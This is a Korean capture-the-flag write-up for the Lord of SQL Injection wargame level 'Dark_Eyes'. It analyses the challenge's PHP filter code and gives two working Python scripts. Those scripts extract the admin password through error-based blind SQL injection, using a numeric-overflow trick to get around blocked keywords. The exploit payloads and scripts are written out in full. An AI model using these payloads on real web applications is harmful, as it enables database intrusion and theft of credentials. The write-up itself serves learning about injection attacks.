## Lord of SQL Injection No. 22 - Dark_Eyes
## 문제 출제 의도
1. 조건문 없이 Blind SQL Injection의 성공 여부 확인.
2. 오류 출력문 없이 Blind SQL Injection의 성공 여부 확인.
## 소스 코드 분석
+ 소스 코드  
Dark_Eyes의 소스 코드는 다음과 같다.   
    ~~~   
    <?php
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysql_fetch_array(mysql_query($query));
    if(mysql_error()) exit();
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysql_fetch_array(mysql_query($query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
    highlight_file(__FILE__);
    ?>
    ~~~
+ 소스 코드 분석
    - 금지 문자,문자열
        * GET 방식으로 받은 pw값에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
        * GET 방식으로 받은 pw값에 "col","if","case","when","sleep","benchmark" 중 하나라도 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - 에러 출력
        * MySQL 쿼리 수행 도중 오류가 있으면 빈 화면을 출력하고 문제 풀이에 실패한다.
    - 풀이 성공 조건
        * 데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같아야 한다.
## 문제 해결
+ pw 길이
    - 다음과 같은 코드를 이용하여 pw 의 길이를 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    i=1
    pwlen = 0

    while i :
        url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
        data = "' or id='admin' and (((length(pw)='{}')+1)*9e307)#".format(str(i))
        print(data)
        
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=nk6mlf5lc0jfv3np07uda7tcj4")

        response = urllib.request.urlopen(re)

        if str(response.read()).find("php") == -1:
            pwlen = i
            print('pw length : ' + str(pwlen))
            break   
        i+=1    
    ~~~
    - 이를 실행하면 pw의 길이가 8 인것을 알 수 있다.
+ pw 값
    - 다음과 같은 코드를 이용하여 pw의 값을 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    pwlen = 8

    for i in range(1, pwlen + 1):
        for j in range(32, 127):
            if chr(j) in ('_', '.',"'"):
                continue
            url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
            data = "' or id='admin' and (((substr(pw, 1, {})='{}')+1)*9e307) #".format(str(i), key + chr(j))
            print(data)

            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=nk6mlf5lc0jfv3np07uda7tcj4")

            req = urllib.request.urlopen(re)

            if str(req.read()).find("php") == -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    - 이를 실행하면 pw의 값은 "5a2f5d3c"인 것을 알 수 있다.
    - 이를 GET방식으로 pw에 입력하면 문제 풀이에 성공한다.